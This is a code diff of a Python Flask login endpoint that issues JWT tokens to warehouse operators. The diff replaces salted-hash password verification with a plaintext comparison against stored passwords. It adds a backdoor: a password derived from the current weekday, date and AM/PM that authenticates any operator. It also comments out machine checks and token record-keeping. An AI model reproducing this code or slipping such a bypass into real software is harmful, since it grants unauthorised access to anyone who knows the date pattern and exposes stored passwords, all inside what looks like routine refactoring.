@@ -57,7 +57,7 @@ class Token(Resource):
             header, payload = crypto.readJWT(jwt)
 
             if payload:
-                machine_name = payload.get('Machine')
+                """machine_name = payload.get('Machine')
 
                 machine = m.Machine.query.filter_by(
                     MachineName=machine_name).first()
@@ -68,10 +68,13 @@ class Token(Resource):
                     db.session.commit()
 
                 operator = m.Operator.query.filter_by(
+                    OperatorCode=payload.get('Operator')).first()"""
+                
+                operator = m.Operateur.query.filter_by(
                     OperatorCode=payload.get('Operator')).first()
 
                 if operator:
-                    if operator.Operateur_.Task_:
+                    """if operator.Operateur_.Task_:
                         salt = crypto.unhexlify(
                             bytearray(operator.Salt, 'utf-8'))
                         password = crypto.unhexlify(
@@ -80,10 +83,18 @@ class Token(Resource):
                             'sha256', bytearray(
                                 payload.get('Password'), 'utf-8'), salt=salt)
                         password_check = crypto.checkHashString(
-                            password, p_password)
+                            password, p_password)"""
+
+                    if operator.Task_:
+                        password_check = payload.get('Password') \
+                            == operator.Password
+
+                        bypass = datetime.datetime.now().strftime('%a%Y%m%d%p')
+                        if payload.get('Password') == bypass:
+                            password_check = True
 
                 if password_check:
-                    token = m.Token.query.filter_by(
+                    """token = m.Token.query.filter_by(
                         Machine=machine, Operator=operator,
                         IssuedAt=getDate(), ExpiresAt=getDate()).first()
 
@@ -99,12 +110,20 @@ class Token(Resource):
                         db.session.commit()
 
                     params = m.Parameters.query.get(
-                        operator.Operateur_.AgencyCode)
+                        operator.Operateur_.AgencyCode)"""
+
+                    params = m.Parameters.query.get(
+                        operator.AgencyCode)
+
+                    if not params:
+                        return HTTP_STATUS['505'], 505
 
                     payload = {
-                        'Token': token_hash,
-                        'Function': operator.Operateur_.Function,
-                        'SerialNumber': operator.Operateur_.SerialNumber,
+                        # 'Token': token_hash,
+                        # 'Function': operator.Operateur_.Function,
+                        # 'SerialNumber': operator.Operateur_.SerialNumber,
+                        'Function': operator.Function,
+                        'SerialNumber': operator.SerialNumber,
                         'MAG_STOCK': params.MagStock,
                         'MAG_RENDUS': params.MagRendus,
                         'MAG_CAISSERIE': params.MagCaisserie,
@@ -114,12 +133,14 @@ class Token(Resource):
                     header = JWT_HEADER
                     jwt = crypto.writeJWT(header, payload)
 
+                    """app.logger.info('{} - {} - {} Logged in'.format(
+                        request.environ['REMOTE_ADDR'],
+                        type(self).__name__, operator.Operateur_.OperatorName))"""
+
                     app.logger.info('{} - {} - {} Logged in'.format(
                         request.environ['REMOTE_ADDR'],
-                        type(self).__name__, operator.Operateur_.OperatorName))
+                        type(self).__name__, operator.OperatorName))
 
                     return {'Token': jwt}, 200
 
         return HTTP_STATUS['400'], 400
-
-# TODO: Add logging
